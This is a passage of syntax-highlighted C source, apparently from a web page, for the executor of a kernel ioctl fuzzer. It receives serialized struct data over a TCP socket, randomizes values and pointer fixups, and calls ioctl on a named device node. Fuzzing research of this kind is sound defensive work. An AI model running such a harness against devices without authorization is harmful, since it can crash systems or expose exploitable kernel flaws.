class="keyword">int</span> offset;</span><br><span class="line">&#125; <span class="keyword">map_entry_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">short</span> tiny_vals[<span class="number">18</span>] = &#123;<span class="number">128</span>, <span class="number">127</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">32</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">255</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> *small_vals;</span><br><span class="line"><span class="keyword">int</span> num_small_vals;</span><br><span class="line"></span><br><span class="line"><span class="comment">// populates small_vals when called</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">populate_arrs</span><span class="params">(<span class="keyword">int</span> top)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (num &lt; top) &#123;</span><br><span class="line">		<span class="comment">//printf(&quot;%d\n&quot;, num);</span></span><br><span class="line">		num &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">		count += <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// top</span></span><br><span class="line">	count += <span class="number">1</span>;</span><br><span class="line">	<span class="comment">// -1</span></span><br><span class="line">	count += <span class="number">1</span>;</span><br><span class="line">	num_small_vals = count;</span><br><span class="line">	num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	small_vals = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*count);</span><br><span class="line">	<span class="built_in">memset</span>(small_vals, <span class="number">0</span>, count);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(num &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		small_vals[i] = num;</span><br><span class="line">		i++;</span><br><span class="line">		small_vals[i] = num<span class="number">-1</span>;</span><br><span class="line">		i++;</span><br><span class="line">		num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	small_vals[i] = <span class="number">0</span>;</span><br><span class="line">	small_vals[i+<span class="number">1</span>] = top;</span><br><span class="line">	small_vals[i+<span class="number">2</span>] = top<span class="number">-1</span>;</span><br><span class="line">	small_vals[i+<span class="number">3</span>] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// generate a random value of size size and store it in elem.</span></span><br><span class="line"><span class="comment">// value has a weight % chance to be a &quot;small value&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_rand_val</span><span class="params">(<span class="keyword">int</span> size, <span class="keyword">char</span> *elem,  <span class="keyword">int</span> small_weight)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((rand() % <span class="number">100</span>) &lt; small_weight) &#123;</span><br><span class="line">		<span class="comment">// do small thing</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> idx = (rand() % num_small_vals);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Choosing %d\n&quot;</span>, small_vals[idx]);</span><br><span class="line">		<span class="keyword">switch</span> (size) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				idx = (rand() % <span class="number">18</span>);</span><br><span class="line">				*(<span class="keyword">short</span> *)elem = tiny_vals[idx];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				*(<span class="keyword">int</span> *)elem = small_vals[idx];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">				*(<span class="keyword">long</span> <span class="keyword">long</span>*)elem = small_vals[idx];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Damn bro. Size: %d\n&quot;</span>, size);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">			elem[i] = (<span class="keyword">char</span>)(rand()%<span class="number">0x100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num_blobs = <span class="number">0</span>, num_mappings = <span class="number">0</span>, i = <span class="number">0</span>, dev_name_len = <span class="number">0</span>, j;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ioctl_id = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> *dev_name;</span><br><span class="line">	<span class="keyword">void</span> *tmp;</span><br><span class="line">	<span class="keyword">char</span> **ptr_arr;</span><br><span class="line">	<span class="keyword">int</span> *len_arr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> seed;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> sockfd , client_sock , c , read_size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span> , <span class="title">client</span>;</span></span><br><span class="line">	<span class="keyword">int</span> msg_size;</span><br><span class="line">	<span class="keyword">void</span> *generic_arr[<span class="number">264</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// max val for small_vals array</span></span><br><span class="line">	<span class="keyword">int</span> top = <span class="number">8192</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// chance that our generics are filled with &quot;small vals&quot;</span></span><br><span class="line">	<span class="keyword">int</span> default_weight = <span class="number">50</span>;</span><br><span class="line">	populate_arrs(top);</span><br><span class="line">	<span class="keyword">int</span> retest = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">goto</span> rerun;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sockfd = socket(AF_INET , SOCK_STREAM , <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (sockfd == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Could not create socket&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Socket created&quot;</span>);</span><br><span class="line"></span><br><span class="line">	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(<span class="keyword">int</span>)&#123; <span class="number">1</span> &#125;, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	 </span><br><span class="line">	server.sin_family = AF_INET;</span><br><span class="line">	server.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	server.sin_port = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Bind</span></span><br><span class="line">	<span class="keyword">if</span>( bind(sockfd,(struct sockaddr *)&amp;server , <span class="keyword">sizeof</span>(server)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//print the error message</span></span><br><span class="line">		perror(<span class="string">&quot;bind failed. Error&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;bind done&quot;</span>);</span><br><span class="line">listen:	 </span><br><span class="line">	<span class="comment">// Listen</span></span><br><span class="line">	listen(sockfd , <span class="number">3</span>);</span><br><span class="line">	 </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Waiting for incoming connections...&quot;</span>);</span><br><span class="line">	c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">	 </span><br><span class="line">	<span class="comment">// accept connection from an incoming client</span></span><br><span class="line">	client_sock = accept(sockfd, (struct sockaddr *)&amp;client, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span> (client_sock &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;accept failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Connection accepted&quot;</span>);</span><br><span class="line">	 </span><br><span class="line">	msg_size = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// Receive a message from client</span></span><br><span class="line">	<span class="keyword">while</span>( (read_size = recv(client_sock , &amp;msg_size , <span class="number">4</span> , <span class="number">0</span>)) &gt; <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// recv the entire message</span></span><br><span class="line">		<span class="keyword">char</span> *recv_buf = <span class="built_in">calloc</span>(msg_size, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">		<span class="keyword">if</span> (recv_buf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate recv_buf\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> nrecvd = recv(client_sock, recv_buf, msg_size, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (nrecvd != msg_size) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Error getting all data!\n&quot;</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;nrecvd: %d\nmsg_size:%d\n&quot;</span>, nrecvd, msg_size);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// quickly save a copy of the most recent data</span></span><br><span class="line">		<span class="keyword">int</span> savefd = open(<span class="string">&quot;/sdcard/saved&quot;</span>, O_WRONLY|O_TRUNC|O_CREAT, <span class="number">0644</span>);</span><br><span class="line">		<span class="keyword">if</span> (savefd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;open saved&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> err = write(savefd, recv_buf, msg_size);</span><br><span class="line">		<span class="keyword">if</span> (err != msg_size) &#123;</span><br><span class="line">			perror(<span class="string">&quot;write saved&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		fsync(savefd);</span><br><span class="line">		close(savefd);</span><br><span class="line">rerun:</span><br><span class="line">		<span class="keyword">if</span> (retest) &#123;</span><br><span class="line">			recv_buf = <span class="built_in">calloc</span>(msg_size, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">			<span class="keyword">int</span> fd = open(<span class="string">&quot;/sdcard/saved&quot;</span>, O_RDONLY);</span><br><span class="line">			<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				perror(<span class="string">&quot;open:&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">int</span> fsize = lseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;file size: %d\n&quot;</span>, fsize);</span><br><span class="line">			lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">			read(fd, recv_buf, fsize);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">char</span> *head = recv_buf;</span><br><span class="line">		seed = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blob_len_arr, blobs</span></span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;seed, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;ioctl_id, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;num_mappings, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;num_blobs, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;dev_name_len, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// srand with new seed</span></span><br><span class="line">		srand(seed);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* dev name */</span></span><br><span class="line">		dev_name = <span class="built_in">calloc</span>(dev_name_len+<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">		<span class="keyword">if</span> (dev_name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate dev_name\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memcpy</span>(dev_name, head, dev_name_len);</span><br><span class="line">		head += dev_name_len;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* map */</span></span><br><span class="line">		<span class="keyword">map_entry_t</span> *<span class="built_in">map</span> = <span class="built_in">calloc</span>(num_mappings, <span class="keyword">sizeof</span>(<span class="keyword">map_entry_t</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">map</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate map\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (num_mappings != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(<span class="built_in">map</span>, head, num_mappings*<span class="keyword">sizeof</span>(<span class="keyword">map_entry_t</span>));</span><br><span class="line">			head += num_mappings*<span class="keyword">sizeof</span>(<span class="keyword">map_entry_t</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* blobs */</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">// first create an array to store the sizes themselves</span></span><br><span class="line">		len_arr = <span class="built_in">calloc</span>(num_blobs, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">		<span class="keyword">if</span> (len_arr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate len_arr\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// we&#x27;ll also want an array to store our pointers</span></span><br><span class="line">		ptr_arr = <span class="built_in">calloc</span>(num_blobs, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">		<span class="keyword">if</span> (ptr_arr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate ptr_arr\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// copy the blob sizes into our size_arr</span></span><br><span class="line">		<span class="keyword">for</span> (j=<span class="number">0</span>; j &lt; num_blobs; j++) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;len_arr[j], head, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">			head += <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// we&#x27;ll also want memory bufs for all blobs</span></span><br><span class="line">		<span class="comment">// now that we have the sizes, allocate all the buffers we need</span></span><br><span class="line">		<span class="keyword">for</span> (j=<span class="number">0</span>; j &lt; num_blobs; j++) &#123;</span><br><span class="line">			ptr_arr[j] = <span class="built_in">calloc</span>(len_arr[j], <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Sizeof(ptr_arr[%d])=%d\n&quot;</span>, j, len_arr[j]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ptr_arr[%d]=%p\n&quot;</span>, j, ptr_arr[j]);</span><br><span class="line"></span><br><span class="line">			<span class="comment">//printf(&quot;just added %p to ptr_arr\n&quot;, ptr_arr[j]);</span></span><br><span class="line">			<span class="keyword">if</span> (ptr_arr[j] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate a blob store\n&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// might as well copy the memory over as soon as we allocate the space</span></span><br><span class="line">			<span class="built_in">memcpy</span>((<span class="keyword">char</span> *)ptr_arr[j], head, len_arr[j]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ptr_arr[%d]=\n&quot;</span>, j);</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len_arr[j];i+=<span class="number">4</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;0x%08x\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ptr_arr[j] + i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">			head += len_arr[j];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> num_generics = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// time for pointer fixup</span></span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_mappings; i++) &#123;</span><br><span class="line">			<span class="comment">// get out entry</span></span><br><span class="line">			<span class="keyword">map_entry_t</span> entry = <span class="built_in">map</span>[i];</span><br><span class="line">			<span class="comment">// pull out the struct to be fixed up</span></span><br><span class="line">			<span class="keyword">char</span> *tmp = ptr_arr[entry.src_id];</span><br><span class="line">		</span><br><span class="line">			<span class="comment">// check if this is a struct ptr or just a generic one</span></span><br><span class="line">			</span><br><span class="line">			<span class="comment">// just a generic one</span></span><br><span class="line">			<span class="keyword">if</span> (entry.dst_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="comment">// 90% chance we fixup the generic</span></span><br><span class="line">				<span class="keyword">if</span> ( (rand() % <span class="number">10</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">int</span> buf_len = <span class="number">128</span>;</span><br><span class="line">					<span class="keyword">char</span> *tmp_generic = <span class="built_in">malloc</span>(buf_len);</span><br><span class="line">					<span class="built_in">memset</span>(tmp_generic, <span class="number">0</span>, buf_len);</span><br><span class="line">					<span class="comment">// 95% chance we fill it with data</span></span><br><span class="line">					<span class="keyword">if</span> ((rand() % <span class="number">100</span>) &gt; <span class="number">95</span>) &#123;</span><br><span class="line">						<span class="comment">// if dst_id is &lt; 0, it&#x27;s abs value is the element size</span></span><br><span class="line">						<span class="keyword">int</span> size = <span class="number">-1</span> * entry.dst_id;</span><br><span class="line">						<span class="keyword">int</span> weight;</span><br><span class="line">						<span class="comment">// if it&#x27;s a char or some float, never choose a &quot;small val&quot;</span></span><br><span class="line">						<span class="keyword">if</span> (size == <span class="number">1</span> || size &gt; <span class="number">8</span>)</span><br><span class="line">							weight = <span class="number">0</span>;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							weight = default_weight;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; buf_len; i+=size) &#123;</span><br><span class="line">							gen_rand_val(size, &amp;tmp_generic[i], weight);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					generic_arr[num_generics] = tmp_generic;</span><br><span class="line">					<span class="built_in">memcpy</span>(tmp+entry.offset, &amp;tmp_generic, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">					num_generics += <span class="number">1</span>;</span><br><span class="line">					<span class="keyword">if</span> (num_generics &gt;= <span class="number">264</span>) &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;Code a better solution for storing generics\n&quot;</span>);</span><br><span class="line">						<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// a struct ptr, so we have the data</span></span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// 1 in 400 chance we don&#x27;t fixup</span></span><br><span class="line">				<span class="keyword">if</span> ( (rand() % <span class="number">400</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="comment">// now point it to the correct struct/blob</span></span><br><span class="line">					<span class="comment">// printf(&quot;placing %p, at %p\n&quot;, ptr_arr[entry.dst_id], tmp+entry.offset);</span></span><br><span class="line">					<span class="built_in">memcpy</span>(tmp+entry.offset, &amp;ptr_arr[entry.dst_id], <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (debug) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ioctl_id: %d\n&quot;</span>, ioctl_id);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;num_mappings: %d\n&quot;</span>, num_mappings);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;num_blobs: %d\n&quot;</span>, num_blobs);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;dev_name_len: %d\n&quot;</span>, dev_name_len);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;dev_name: %s\n&quot;</span>, dev_name);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;data[]: \n&quot;</span>);</span><br><span class="line">            <span class="comment">//printf(&quot;(0x%x)\n&quot;, *(int *)&amp;ptr_arr[0]);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, &amp;ptr_arr[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)ptr_arr[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">1</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">1</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">2</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">2</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">3</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">3</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">4</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">4</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+5*8));</span></span><br><span class="line">            <span class="comment">//printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+6*8));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//printf(&quot;(0x%x)\n&quot;, (int *)ptr_arr, (int *)ptr_arr);</span></span><br><span class="line">            </span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// time for the actual ioctl</span></span><br><span class="line">		<span class="comment">//printf(&quot;Try to open device %s\n&quot;, dev_name);</span></span><br><span class="line">		<span class="comment">//fflush(stdout);</span></span><br><span class="line">		<span class="keyword">int</span> fd = open(dev_name, O_RDONLY);</span><br><span class="line">		<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">&quot;Open devicd %s successfully.\n&quot;</span>, dev_name);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//fflush(stdout);</span></span><br><span class="line">		<span class="comment">//printf(&quot;Try to call ioctl(fd=%d, ioctl_id=%d, ptr_arr=%p)\n&quot;, fd, ioctl_id, ptr_arr[0]);</span></span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%10d:&quot;</span>, cnt++);</span><br><span class="line">		<span class="keyword">if</span> ((ioctl(fd, ioctl_id, ptr_arr[<span class="number">0</span>])) == <span class="number">-1</span>)</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;good hit\n&quot;</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;device %s closed\n&quot;</span>, dev_name);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (retest)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="comment">// okay now free all the shit we alloced</span></span><br><span class="line">		<span class="built_in">free</span>(recv_buf);</span><br><span class="line">		<span class="built_in">free</span>(dev_name);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">map</span> != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">		<span class="built_in">free</span>(len_arr);</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_blobs; i++) &#123;</span><br><span class="line">			<span class="comment">//printf(&quot;%d: free&#x27;ing %p\n&quot;, i, ptr_arr[i]);</span></span><br><span class="line">			<span class="built_in">free</span>(ptr_arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">free</span>(ptr_arr);</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_generics; i++) &#123;</span><br><span class="line">			<span class="built_in">free</span>(generic_arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		write(client_sock, &amp;msg_size, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		msg_size = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">if</span>(read_size == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Client disconnected&quot;</span>);</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		close(client_sock);</span><br><span class="line">		<span class="keyword">goto</span> 